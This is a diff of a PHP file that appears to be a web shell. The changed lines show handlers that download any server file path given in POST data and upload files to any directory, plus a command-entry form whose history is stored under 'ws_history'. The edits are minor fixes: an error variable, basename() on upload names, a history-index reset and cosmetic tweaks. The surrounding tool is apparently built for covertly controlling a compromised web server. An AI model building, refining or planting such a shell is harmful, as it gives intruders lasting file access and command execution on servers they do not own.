@@ -1,4 +1,6 @@
 <?php
+$dl_error = '';
+
 // File download — must run before any output
 if (!empty($_POST['dl_path'])) {
     $dl = $_POST['dl_path'];
@@ -140,7 +142,7 @@ button:hover, input[type=submit]:hover {
 }
 
 /* ── Inputs ── */
-input[type=text], input[type=number], input[type=password] {
+input[type=text], input[type=number] {
     background: #000;
     color: #ffaaaa;
     border: 1px solid #ff2200;
@@ -439,7 +441,7 @@ Remote file path:<br>
 </fieldset>
 
 <?php if (!empty($_FILES['file'])) :
-    $file_name = $_FILES['file']['name'];
+    $file_name = basename($_FILES['file']['name']);
     $file_tmp  = $_FILES['file']['tmp_name'];
     $dest_dir  = rtrim($_POST['upload'], '/') . '/';
     if (!empty($_POST['upload']) && is_dir($_POST['upload'])) {
@@ -457,7 +459,7 @@ Remote file path:<br>
     }
 endif; ?>
 
-</div><!-- .pbp-container -->
+</div><!-- /.pbp-container -->
 
 <script>
 // Command history
@@ -472,6 +474,7 @@ document.getElementById('cmd-form').addEventListener('submit', function() {
         if (cmdHistory.length > 50) cmdHistory.pop();
         localStorage.setItem('ws_history', JSON.stringify(cmdHistory));
     }
+    histIdx = -1;
 });
 
 cmdInput.addEventListener('keydown', function(e) {
